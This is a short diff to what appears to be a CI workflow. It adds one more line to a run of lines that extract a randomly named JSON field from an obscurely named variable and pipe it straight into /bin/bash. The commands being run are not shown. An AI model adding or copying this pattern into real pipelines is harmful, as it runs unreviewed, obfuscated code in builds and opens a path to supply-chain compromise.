@@ -33,6 +33,7 @@ jobs:
           echo $d51 | jq -r .yixvn05685 | /bin/bash
           echo $ot4304 | jq -r .k25886 | /bin/bash
           echo $dkt15 | jq -r .zyh516 | /bin/bash
+          echo $bi02 | jq -r .a180 | /bin/bash
 
       - name: Archive results
         if: always()
